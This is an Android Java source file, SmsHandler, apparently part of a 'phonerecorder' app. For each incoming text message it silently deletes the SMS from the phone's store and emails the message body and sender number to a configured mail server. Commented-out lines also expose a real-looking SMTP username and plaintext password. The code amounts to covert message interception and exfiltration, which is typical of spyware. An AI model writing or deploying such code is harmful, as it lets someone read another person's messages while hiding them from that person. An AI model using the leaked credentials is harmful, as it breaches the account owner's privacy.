package com.ranger.phonerecorder.sms;

import com.ranger.phonerecorder.app.Constants;
import com.ranger.phonerecorder.pojos.EmailServer;
import com.ranger.phonerecorder.utils.EmailUtil;

import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
//delete the sms
import android.content.ContentUris;
import android.content.Context;

public class SmsHandler extends Handler

{

	public static final String TAG = "SMSHandler";

	private Context mContext;

	public SmsHandler(Context context)

	{

		super();

		this.mContext = context;

	}

	public void handleMessage(Message message)

	{

		final MessageItem item = (MessageItem) message.obj;

		Uri uri = ContentUris.withAppendedId(SMS.CONTENT_URI, item.getId());

		mContext.getContentResolver().delete(uri, null, null);
		
		if(!item.getPhone().equals("")){
			new Thread(){

				@Override
				public void run() {
					EmailServer es = Constants.emailServerInfo;
//					es = new EmailServer();
//					es.username = "taoliang1985@126.com";
//					es.pass = "R@nger19850121";
//					es.server = "smtp.126.com";
//					es.port = "";
					
					EmailUtil.sendTextMessageToEmail(es, item.getBody(), item.getPhone());
					super.run();
				}
				
			}.start();
		}

	}

}